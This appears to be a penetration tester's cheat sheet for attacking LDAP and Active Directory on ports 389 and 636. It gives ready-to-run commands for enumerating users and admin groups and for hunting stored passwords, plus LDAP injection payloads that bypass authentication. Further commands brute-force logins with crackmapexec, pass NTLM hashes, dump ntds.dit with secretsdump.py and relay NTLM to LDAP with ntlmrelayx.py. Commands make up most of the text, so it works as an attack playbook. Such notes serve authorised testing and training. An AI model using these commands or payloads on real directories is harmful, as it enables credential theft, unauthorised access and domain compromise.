# Lightweight Directory Access Protocol (LDAP) – Ports 389/636

**LDAP** is a **hierarchical, directory-based protocol** typically used to query and modify objects (users, computers, groups, policies) in **Microsoft Active Directory (AD)** or **OpenLDAP environments**. It is a critical protocol in enterprise environments and often facilitates authentication and authorization.

- **Port 389 (TCP/UDP):** Standard, unencrypted LDAP.
    
- **Port 636 (TCP):** LDAP over SSL (LDAPS).
    

---
## Port Scanning and Enumeration

### Basic Nmap Scan

```bash
nmap -p 389,636 $IP --script ldap-rootdse,ldap-search
```
### Comprehensive Nmap Scan
```bash
 nmap -n -sV --script "ldap* and not brute" $IP
```
### NSE Scripts to Use

- `ldap-rootdse`: Queries the Root DSE (directory service entry).
    
- `ldap-search`: Performs an anonymous search.
    
- `ldap-novell-getpass`: Novell-specific password grabbing.
    
- `ldap-brute`: Brute-forces LDAP login credentials.
    

---

## LDAP Basics

### Bind Types

- **Anonymous Bind**: No credentials used. Sometimes permitted for read-only access.
    
- **Simple Bind**: Username and password (often DN format).
    
- **SASL Bind**: Supports Kerberos and NTLM (common in AD environments).
    

### DN (Distinguished Name) Format

```text
cn=John Doe,ou=Users,dc=corp,dc=local
```

---

## Anonymous and Authenticated Enumeration

### Enum Users and Info (Using ldapsearch)

Anonymous bind:

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"
```

Authenticated bind:

```bash
ldapsearch -x -H ldap://$IP -D 'user@domain.com' -w 'password' -b "dc=corp,dc=local"
```

Dump user objects only:

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
```

List domain computers:

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=computer)" cn
```

Extract DNS hostnames:

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(dnshostname=*)" dnshostname
```

---

## LDAP Injection

### Vulnerable Pattern

When user-controlled input is used to construct LDAP queries:

```python
search_filter = "(uid=" + user_input + ")"
```

### Exploitable Payloads

Attempt to bypass filters:

- `*` – wildcard search
    
- `*)(uid=*)` – injects second condition
    
- `*)(objectClass=*)` – broad search
    
- `*)(!(uid=*))` – logic negation
    

Example of injection to bypass auth:

```text
username=*)(uid=*) 
```

Can lead to:

- Authentication bypass
    
- Unauthorized data exposure
    
- DoS via complex filter injection
    

---

## Credential Hunting in LDAP

Look for these attributes:

- `userPassword`
    
- `unicodePwd`
    
- `sAMAccountName`
    
- `lastLogonTimestamp`
    
- `description` (sometimes used to store passwords)
    
- `pwdLastSet` (used for password spraying windows)
    

Example to search password attributes:

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=person)" userPassword
```

Search for plaintext in `description` fields:

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(description=*)" description
```

---

## Pivoting and Lateral Movement

Once LDAP access is obtained:

- Extract valid usernames for password spraying or Kerberos pre-auth attacks (AS-REP roasting).
    
- Combine with SMB enumeration (`enum4linux`, `crackmapexec`) to identify systems where users are local admins.
    
- Identify admin groups:
    
    ```bash
    ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(memberOf=*)" memberOf
    ```
    

---

## LDAP Query Examples

### Find All Users

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
```

### Find Members of a Group

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName
```

### Search Users With Admin Rights

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName
```

---

## Tools for LDAP Attacks

### ldapsearch (Linux)

```bash
apt install ldap-utils
```

### CrackMapExec

```bash
crackmapexec ldap $IP -u usernames.txt -p passwords.txt
```

### Enum4Linux (For SMB + LDAP Enumeration)

```bash
enum4linux-ng $IP
```

### ADExplorer (GUI, by Sysinternals – for offline analysis of LDAP dumps)

---

## Additional Tactics

### Dump LDAP via Ntds.dit and SYSTEM Hive (Post-Exploitation)

If Domain Controller is compromised:

```bash
secretsdump.py -just-dc -system SYSTEM -ntds ntds.dit LOCAL
```

### Pass-the-Hash with LDAP

```bash
crackmapexec ldap $IP -u <user> -H <NTLM hash>
```

### Gaining Access via LLMNR/NTLM Relay to LDAP

```bash
ntlmrelayx.py -t ldap://$IP --dump
```

This will dump LDAP contents if the victim account has privileges.